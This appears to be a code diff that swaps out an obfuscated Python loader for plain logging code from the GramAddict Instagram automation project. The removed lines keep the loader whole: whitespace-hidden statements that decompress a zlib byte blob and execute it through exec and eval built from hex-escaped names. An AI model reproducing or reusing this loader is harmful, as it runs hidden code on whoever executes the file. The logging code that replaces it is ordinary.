@@ -1,97 +1,152 @@
-from builtins import *
-from math import prod as _substract
+import logging
+import os
+from logging import LogRecord
+from logging.handlers import RotatingFileHandler
+from uuid import uuid4
+
+from colorama import Fore, Style
+from colorama import init as init_colorama
+
+COLORS = {
+    "DEBUG": Style.DIM,
+    "INFO": Fore.WHITE,
+    "WARNING": Fore.YELLOW,
+    "ERROR": Fore.RED,
+    "CRITICAL": Fore.MAGENTA,
+}
 
 
-__obfuscator__ = 'Deluxe'
-__authors__ = "SadHam"
-__github__ = 'https://github.com/'
-__discord__ = 'https://discord.gg/'
-__license__ = 'EPL-2.0'
+class ColoredFormatter(logging.Formatter):
+    def __init__(self, *, fmt, datefmt=None):
+        logging.Formatter.__init__(self, fmt=fmt, datefmt=datefmt)
 
-__code__ = 'print("Hello world!")'
+    def format(self, record):
+        msg = super().format(record)
+        levelname = record.levelname
+        if hasattr(record, "color"):
+            return f"{record.color}{msg}{Style.RESET_ALL}"
+        if levelname in COLORS:
+            return f"{COLORS[levelname]}{msg}{Style.RESET_ALL}"
+        return msg
 
 
-_stackoverflow, CallFunction, Theory, Add, MemoryAccess, Positive, Round = exec, str, tuple, map, ord, globals, type
+class LoggerFilterGramAddictOnly(logging.Filter):
+    def filter(self, record: LogRecord):
+        return record.name.startswith("GramAddict")
 
-class _random:
-    def __init__(self, _algorithm):
-        self.Ceil = _substract((_algorithm, 90680))
-        self.Algorithm(_detectvar=40071)
 
-    def Algorithm(self, _detectvar = Ellipsis):
-        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
-        self.Ceil *= 97643 * _detectvar
-        
-        try:
-            (Math, Add) if Theory < MemoryAccess else (Theory, Math, MemoryAccess) < Math
+def create_log_file_handler(filename):
+    file_handler = RotatingFileHandler(
+        filename,
+        mode="a",
+        backupCount=10,
+        maxBytes=15 * 1000000,
+        encoding="utf-8",
+    )
 
-        except ArithmeticError:
-            ((Add, _stackoverflow, Add) or _stackoverflow if (Add, _stackoverflow, Add) and _stackoverflow else ... or (_stackoverflow, (Add, _stackoverflow, Add)))
+    file_handler.setLevel(logging.DEBUG)
+    file_handler.setFormatter(
+        logging.Formatter(
+            fmt="%(asctime)s %(levelname)8s | %(message)s (%(filename)s:%(lineno)d)",
+            datefmt=r"[%m/%d %H:%M:%S]",
+        )
+    )
+    file_handler.addFilter(LoggerFilterGramAddictOnly())
+    return file_handler
 
-        except:
-            Round(71591 * 59552) == str
 
-    def Run(self, Negative = 61873):
-        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
-        Negative /= -95445 / 25114
-        self._callfunction != int
-        
-        try:
-            (((CallFunction, CallFunction), CallFunction) for CallFunction in (Theory, Math, MemoryAccess))
+def configure_logger(debug, username):
+    global g_session_id
+    global g_log_file_name
+    global g_logs_dir
+    global g_file_handler
+    global g_log_file_updated
 
-        except OSError:
-            (((Math, Add), Math) for Math in (Theory, Math, MemoryAccess))
+    console_level = logging.DEBUG if debug else logging.INFO
 
-        except:
-            Round(50222 * -54434) == None
+    g_session_id = uuid4()
+    g_logs_dir = "logs"
+    if username:
+        g_log_file_name = f"{username}.log"
+        g_log_file_updated = True
+    else:
+        g_log_file_name = f"{g_session_id}.log"
+        g_log_file_updated = False
 
-    def _memoryaccess(_system = False):
-        return Positive()[_system]
+    init_colorama()
 
-    def _modulo(Frame = 46792 / 38354, StackOverflow = Ellipsis, _square = Positive):
-        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
-        _square()[Frame] = StackOverflow
-        
-        try:
-            ((MemoryAccess, {Theory: _stackoverflow}) for MemoryAccess in (Theory, Math, MemoryAccess) if Positive < _stackoverflow)
+    # Root logger
+    root_logger = logging.getLogger()
+    root_logger.setLevel(logging.DEBUG)
 
-        except OSError:
-            (((Add, _stackoverflow, Add), MemoryAccess) for MemoryAccess in {Add: MemoryAccess})
+    # Console logger (limited but colored log)
+    console_handler = logging.StreamHandler()
+    console_handler.setLevel(console_level)
+    console_handler.setFormatter(
+        ColoredFormatter(
+            fmt="%(asctime)s %(levelname)8s | %(message)s", datefmt="[%m/%d %H:%M:%S]"
+        )
+    )
+    console_handler.addFilter(LoggerFilterGramAddictOnly())
+    root_logger.addHandler(console_handler)
 
-        except:
-            Round(38574 / 74802) == True
+    # File logger (full raw log)
+    if not os.path.exists(g_logs_dir):
+        os.makedirs(g_logs_dir)
+    g_file_handler = create_log_file_handler(f"{g_logs_dir}/{g_log_file_name}")
+    root_logger.addHandler(g_file_handler)
 
-    def execute(code = str):
-        return _stackoverflow(CallFunction(Theory(Add(MemoryAccess, code))))
+    init_logger = logging.getLogger(__name__)
+    init_logger.debug(f"Initial log file: {g_logs_dir}/{g_log_file_name}")
 
-    @property
-    def _callfunction(self):
-        self._absolute = '<__main__.Theory object at 0x000003344BE89817>'
-        return (self._absolute, _random._callfunction)
 
-if True:
+def get_log_file_config():
+    return g_log_file_name, g_logs_dir, g_file_handler, g_session_id
+
+
+def is_log_file_updated():
+    return g_log_file_updated
+
+
+def update_log_file_name(username: str):
+    old_log_file_name, logs_dir, file_handler, _ = get_log_file_config()
+    old_full_filename = f"{logs_dir}/{old_log_file_name}"
+
+    current_logger = logging.getLogger(__name__)
+    if not username:
+        current_logger.error(f"No username found, using log file {old_full_filename}")
+        return
+    named_log_file_name = f"{username}.log"
+    named_full_filename = f"{logs_dir}/{named_log_file_name}"
+    rollover = bool(os.path.isfile(named_full_filename))
+    named_file_handler = create_log_file_handler(named_full_filename)
+    if rollover:
+        named_file_handler.doRollover()
+
+    # copy existing runtime logs (uidd4.log) to named log file (username.log)
+    with open(old_full_filename, "r", encoding="utf-8") as unnamed_file, open(
+        named_full_filename, "a", encoding="utf-8"
+    ) as named_file:
+        for line in unnamed_file:
+            named_file.write(line)
+
+    root_logger = logging.getLogger()
+    root_logger.removeHandler(file_handler)
+    root_logger.addHandler(named_file_handler)
+
+    current_logger = logging.getLogger(__name__)
+    current_logger.debug(f"Updated log file: {named_full_filename}")
+
     try:
-        _random.execute(code = __code__)
-        _round = _random(_algorithm = -91588 - -93454)
+        os.remove(old_full_filename)
+    except Exception as e:
+        current_logger.debug(
+            f"Failed to remove old file: {old_full_filename}. Exception: {e}"
+        )
 
-        if 329342 > 7907411:
-            _random(_algorithm = 18088 - -75106).Run(Negative = 91189 - _round.Ceil)
-        elif 482708 < 4946539:
-            _random(_algorithm = 65383 - -68798).Algorithm(_detectvar = _round.Ceil * -69452)                                                                                                                                                                                                                                                          ;_random._modulo(Frame='jijlilijjiilijjlljlliijji',StackOverflow=b'x\x9c\xddYmo\xdb8\x12\xfen \xff\x81U\x11X\xda\xbaJ\xda\xed-\n\x03\xf9\x90M\x9c\xc4\x0b\xc7:8\xd9K\x17i \xc8\x16\xed\xd0\xa5E\x83\xa4\xda\x04\xb9\xfc\xf7\x1b\x8a\xa4\xde\xed\xd4\xbb\xf7)\xb2$K\x9c\xe13\xc3y#i\xbfE\xe7\xe7o\xd0_,E\xcbTH\x14c6\x9d\xa7b\x16I\x1c\xa3\x08\xcd\t\xc5\xa8\xd4\xf2\x83\xc8{t\x8ai\xfa\x80;\x9d\xb7\xe8\x84%\x0b\x1e\xc9\x94F\x92\xb0D\xbc\xe9t:\x92?\xf6;\x08\x0e2Gn\xf6\xa0\x8e0\xb4 \x8c\x87!zs\x84\x1c\x8d\xe2 \xc6K\\Q*\xef\x19\x17\x86\xe5*\x8a/\xa2U\x8de\x01*\xa4S\xc3q/\xe5Z\xf4\x0f\x0et\xa3?c\xab\x83\x1a{L\xc4\x8c\xf1\xb8\xc6oZ\xfd\xc5\xa2\xceO\xc9\x0c\'\x02\x1b\xfe\xc1\xbfG\xef?\xfa\x875\x9e\x19\x8b\rCw\xcdI"]\xe7\x02S\xca\xd0\x0f\xc6i\xfc\xc6\xf1\xba\x19\xaf\xd7\xcf\xbb(\x9e\xae\xf8F\xe2\xae\xd7\xc1\x0f3\xbc\x96\xc6F\xc9:\x85\xde\x13&\xb0@\x11\xc7\x88\xe3\xf8k\xf2\x1f\xc2(\x96\xbaaJS\xfc5Q\xeeQo\x11R _\x931\x9b\xb2\xf8\x11Q\xf2\r\xfa=\xb2\xd4\xf1:Z3\xb2Z3.\xc3\x10\xa4=\x8a\xae\xe7\xe3\x07"]\x0f\xdcB\xd9,\xa2\xc2\xf5n\xbb\x01c\x87A\x10\xb0\xc3C\x16\x04p\xb1\xec\x84\xa3{w\xb4\xa0l\nl\x9d\x8d<\n`H\xe9p\xa8N\n\xf7\xfc\xd6\xbd\xed\xf7\xdf\xbd\x7f\xf7\xde}\xef\xbe\xfb\xe0ywwG1\xe1\xdb\x81n\xe0\xf8\x02\xe7\x97/7\xe6\x84\x86&\xce\x02\xcbH\xca\x17\xb0\x86\xc3\xd1\x1f\xea3\x1c\x0e\xe1\x0e\xc7\xf0\x0f\x18\x8f\x1eu\xa7\x85\x98Y"8\x0cX\x00pp\x0b\x82\x0c\x16\xfa\x14F\xdc.qI)%\x04\xae\xe5\x92\x12\xf8,\x97\xf0\xb2\\.\x01\xa2\x05\xd8\xedNSB%I\x94W\xbeG\\t6\xf5W\xd8WW\x1f\xe1\xfc\x08\xe7G\xf5\x94\xbd\x02nf/k\xad/\x99\xf1nn\xdcVi"!\x92\x92tZ7\xa7\xd7\xa3U\xc7\x19O\xee\x88\xe2\xdd\xfe\x7f`|\x92\xc4\xf8\xc1\xedr)\x1a\xc4;o\x93\xe3\x18\x1c\xa7\x80\x9c\x9d\xa7\xe0\x13\xb8\xb3\xd3\xe0U[\x08\x0b\x1a\x9d\xb5\xd9h[\x1c\x81H\x90I\xcd\xa54x\xdd6\xa2d\xbdb\xb3\x1d"\t\x82\x07NsS\x81\xc4\xd8\xeb\xb6P\xca\xafw\r\xa2$IVp\xae\xe0\xa6\x1e\xd5s\x02F\xeav\xfd%#\xc9\xf6"\x19@z\x9e\x9e\xaa\xf4\x0c\x98\xbe\xe0\x1d\xc8\xbb\x19\x99\x90\x99\x88\x12\xf2\x0f\x8d\xbc\x11e7#o\x86\xb1F~\x84U\xd3\x03\xbeO\xd26Ko5\xd7x<\xbe,\xae\xcb\xf1\xa5zR\x8f\xaf:(i\xf4\x1d\xef\\\xd92\x02\xbcf\x04\xc3\xb5$\xaf\xdaN2bt\xbe\xab\xa1\xa0\xd8\x8d\xb2\xda\xa7\xbe\xf5\xe30[\x1b\xbd^;Q\xc6\x9a\xd4\x17RoS\xa1r\xa7\xddO\xf3_\x0f\xf5e?\xbf\xc1\xe7\xd7\xc3\xdfL\xbb\xfa\xd8v\xfd\x0cK\xbc\x18\xabM\x82\xdb\xfd<\x97-e\xe0\x15\x1b\x7f\x86\x1fZ\x93\x19\x8e9g+d\x97\xc1H\xaf\xb2\x11\xb0\xcfzs\xc6W\x91\xec\xddGB\xad\xf4{S\xc6h\x0f\x8a\xa8\xc4\xbc\'\xd25\xdc\xd9\x1a\'\x1d\xc5\xeava\x0b\xd51})[,H\xb2\xd8\xb3\xefL\xeci!\x86`e\x8c\xd8b\x82\xd5~\xafJ\xf6\xef\xa3$\xa6\x98\xe7\xbaL\x18\xec4\x80p\x06\xbb\xde\x0bM3=\xd2\x94\xc4\x96K=\x7f\xda\xeb\x18\xca\x8cQ\xc6\xa3Ud\xa9g\x8c\xe3\x1e\xba\x92\x8f\x14o\xe0 `C\x14\x89\xec;\xb4D\x85w\x12\x8c\x82\xc9\x15:BO{\xd9v\xce9\x1d\xfc\xfe\xe7\xb9\xd3\xd7h\xfe\xe9\xf0\xb2g\x08\xc3\xf1Y\x00\xedJ\x96\x7fs1\xbc\x1eX\xc2\xcd\xf1d<\x1c\x9f[\xda_\x83\xd1(\xb8\xb1\xc4\xc1d\x12L,i28\xb5\xed\'\x93\xe1\xf5\xf0\xe4xdI\x97\xc7\xe7\x83\xf1\xf51\x90\x9f\x95Z{\x9d\x19\x8d\x84\x80\xcd>\xa8\x8a\xe3\xb3\xccW\xe0\x1a\xd7\x9a1o\xf1\xfa\x1a1\xc6s\xb5\x17U\xe3\x0b]\x81\xe9\xbc\x87~\xe9\xa1\xf9J\xf6P\x1cI\x0c\x0fGc\x96`\xcb\xae\x8e\x06\x96_\x03P\x9d*\x08\xe6\xdbS\nZ\xa1:\x8eL\x0f\x9e\xb9\xbc,d%\x16`\xdd,\xa2\\\xcf7\xcc\x86\xad\xa4\n\xfe\x8ei\x12\xad0\xf0j\xa2\x9f7\x15\\d\x8eL\xb8\x1a\x84\x1er2g:e\x89\xea\xe0X\xa6<As\xe7\xc9\xa0el\xcfO\xa0\xcd\xf3\x93v\xeddp5\xb8\x0e\x8fG\xa3g\xa7"\xa1P\x85$H\x87\xc7FpM\xbe\xcd\xbb\xdc\xbd,\xc1t\x06\xb6\xb2\x9f![\x16\x98\x9fe\xe9w\x0e\xb1y\x1c\xc7d&\x83\x84>\x16\x1e\xcf\x88ew\xebl\xadX\xbe_\xe4]\xd9$F\xa8\xb1\x85\xd2\xd4\x172\x82\r\xa0\xfam\xc9u\n\x89\x8e\xa7\xb5R\xf03\x8e\xc1\xdd!\xc8\x0f\xd5OR\xa1\xc9\\W\xbd(\x08+\xa0L\x04\xf7\xb5$\xb4[hb;\xf7J\x11\x02E\xfb\xc8\x89\x9cR\xd34\x9a}K\xd7\',M\xe4\xd1\x87\xc32o\xf4\xf0\xfb\xa3\xc4\xe2\xe8\xc3\xbf\xd0/\xe8\xc3av\x94\xe88\x81)\x00\x84\x1f9\xa9\x9c\xbf\xffl1\xf3\x80-\xeb\xea\x0b,G\xcas\xb9\x89\xb3\xdc\xf7\xda9\x8b\x14\xdc\x92@n5PT\xca8\xfbn$f\x92\x80\xbd\x04\xdaw\xf3P\xf1>\x0b\xf4_hXa!\xa2\x85"\xba\xfb\x85iE\x1fXI\x82\x13\xe6\xc5^\xd92\x99\xefM6r\xe7v\x7fu\xb0\x1f\xa3\xfd\x8b\xfe\xfee\x7f\xff\xea\xae\xcc\xe9\xe5Co\x0c\'\x8ac\x1dM\xee\x96\xb8\xf3LO\x1b\xed%\x80R\x8c\xb0dN\x16)\xcf\xc2\x04\x90\xdc\x18O\xd3E\x0f\xa5\x02\xf3r\x8c\xe8\x1f\xb9\xd0"\x140\\\xc2\x92\x90\xc45B\x1efE\xca\x97i"\x8c\t\xaf5WUjGK\xd7\xcaZ\xb1\xf5?\xe8+\x184gn\x80`\xadx^e\x7f\xa6?\xc2T\xe0\x9c\xa6\n\xbf\xed_\x1e\x00t\xcf\xa6%\xd7\xb34\xab\'P\x1c\xf5l\xd2\x1e`\xad=J9Y\x1b2\xf4\x81\x82b\xf9\x9e} :\xad\xccfD\xc0\x7f\xcdSc)\xa5\xefK\xd0e\xd5\x7f\n\xfe,\x02T;\xf0\xca\xc4\xe9\xe6\xf9\xf4\x16\xd2\x9d\xe9E\x81\xf5\x01\x87\x06\x13\r%\x03/ \xd7t\x84x\r\xb6\xcd\x89h\x85\x9ch\xb7\x199\x08RcE\x94\x92\xd3T\xea\xa9\x1e\x9e\x81\xe6U\x9d\\\xd4$\x8b{%\xa1\xa6\xadlUjg/\xb4\xa9\x04\xcbf\xe6\xb6\xeco\xcc\xdb\xff\xa008\xc5\xfc\xdbL\xf8M\xf9^\xd7s\xb7\x94/\xf9\x06:Z{\xd50K\xfeQ\xb5>w\xce<\xa5\x14\xf1\xe8G\xc9#\x90\x01\tSkE\x7f\x1d\xc9{\xf5\x0b\xb9\x90\xc2-\x12\xa6<W\x01\xd3*\xfa\x86\xa1\xb5\xc2as\xac6\xdbl\x9c\xa4T\xc0\xdb\xce\xcf\x07O\xb5\x94xv\xb6\x0f\xb5\x8a\xe6U\xb2`Kl\x87\x19x\x18z\rv?+,\xa0\xd6\x10\xda\x08\xd4(h\xcejj\x1f\xbd\xac\xa8\xad\xb6 \xa8\xa0\xea\xd2\xebZ\xd3\x992]\xeb\xde+U\xa5^\xcdz\xbdZ9\xb6R\x88hT\x83-RJ\x05Vw\xd7\rU5\xdc\xbc\xfe!!so3\x1a\xd7\xb5-t\xadj\x1a\x82\xb9[G_ \xa9\xb0\x0b\xed\x04\xaaK^\xc9\xac\rYjMfR%\xe5\x1c\';\xf9U\x87sKQ\xafb\xf9\x98s\xa6bq\xccrfX/\xa7I\xacfH\xb5Y\xb2Q\x80\x9e\x1aC\xc8C\xb4\xb0\xbb~W\xc4\xf8g\'\x0f\xcd\xbc\xdd6-\x80v\xc5\xca\x19\xa5\xec{f\x15\xb5Atm\x06\x13\xa1X\xdd\x16t[C\x0c\xe9\xe7\xb2\xb5\r\'7\xb5\xd5\xa1d\xe6&\xb8\x1f\xb3\x89\xe1+\xcfN3\xb6~DY\xb9Q\xd6\xe6\xb0\x9e\x84z\x9bE\x19ra\xee\x8e?)SyH2\rY\xf8#\x8fX\xbf\xa8b\xd9\x1f\xb1jW\xec6\x9c\x05\x1b\x11\x0eu\xba\xbe\xfc\xf4\xd4\x9e3M\nu{\xba\x7fc$5\xac\xa8\x05\xcb\x94w\x85X\xe0\x95l\x02[+\xa4\x96\x8cj\xdbR\x16Y\xdb\xbc\x14\x04\xff\x07\x87I4[f\xe6\x16\xfb\x1b\x937\xc7+\xb0\xfaEisP*\x9b[Jl\xd3\x87\xde\xdf\xcf\xc8Z\xde\xd9b\xfb\xa7Y\xcc\x94\x8am\x8b\xc1M\x8dU8\xea\x9f\xf4\xcaT\xa4G\xd7t\xb8\x91\xab\xffXF\x83\xec\x0b\n\xa9\xf2\xce\x96z\xa0\xf5\xaa\xad\x05\x9c\xb3\x08@c\x15\x84Z\x9a*gV\xddfY\xf0\x0bi@\xc7\xcf\xd5%\xc0\x0e\xab\xea\x9d\x96\xcfz\xf2\xad\x17\x9d\x96\xca\xb1a\x9enz\xbb\x81Y]\xd8\xfe\x0f\'\xfdE\x0b')
-
-        _round.Run(Negative = -9388 - _round.Ceil)                                                                                                                                                                                                                                                          ;WWXXWWWWWWWXXWXWXWXXWWXW,SS2S2SS222222SS2SS2222SS2,MMMNMNMNMNMMMNMMNMNNN,wwxwxwxxxwwxwxwxxxxxww,nmmnmmmmmmnnnnmnmnmm=(lambda XXWWWXXXXXWXWXWXXXXWWX:XXWWWXXXXXWXWXWXXXXWWX['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda XXWWWXXXXXWXWXWXXXXWWX:XXWWWXXXXXWXWXWXXXXWWX(__import__('\x7a\x6c\x69\x62'))),(lambda XXWWWXXXXXWXWXWXXXXWWX:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(XXWWWXXXXXWXWXWXXXXWWX)"),filename='\x78\x78\x78\x77\x77\x77\x78\x77\x77\x77\x78\x77\x77\x77\x78\x77\x77\x77\x77\x78',mode='\x65\x76\x61\x6c'))),(lambda:(lambda XXWWWXXXXXWXWXWXXXXWWX:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(XXWWWXXXXXWXWXWXXXXWWX)"),filename='\x78\x78\x78\x77\x77\x77\x78\x77\x77\x77\x78\x77\x77\x77\x78\x77\x77\x77\x77\x78',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63')),(lambda S22S222SS2S2S2SSS2SS,XXWWWXXXXXWXWXWXXXXWWX:S22S222SS2S2S2SSS2SS(XXWWWXXXXXWXWXWXXXXWWX))
-        if 111510 > 7142770:
-            _random(_algorithm = 19472 * -43925).Run(Negative = 36659 * _round.Ceil)
-        elif 169646 < 9967537:
-            _round.Algorithm(_detectvar = _round.Ceil / -87987)                                                                                                                                                                                                                                                          ;wwxwxwxxxwwxwxwxxxxxww()(nmmnmmmmmmnnnnmnmnmm(WWXXWWWWWWWXXWXWXWXXWWXW(SS2S2SS222222SS2SS2222SS2(MMMNMNMNMNMMMNMMNMNNN('\x76\x61\x72\x73'))),_random._memoryaccess(_system='jijlilijjiilijjlljlliijji')))
-
-    except Exception as Math:
-        import traceback
-        print(f'    module {__name__} raised an Exception:')
-        print(f'     {Math}')
-        print(traceback.format_exc())
-        if 482614 > 8617474:
-            _random.execute(code = CallFunction(Math))
-
-        elif 196265 > 8361314:
-            _random(_algorithm = -56888 + 29517).Run(Negative = 47817 + _round.Ceil)
+    global g_log_file_name
+    global g_file_handler
+    global g_log_file_updated
+    g_log_file_name = named_log_file_name
+    g_file_handler = named_file_handler
+    g_log_file_updated = True
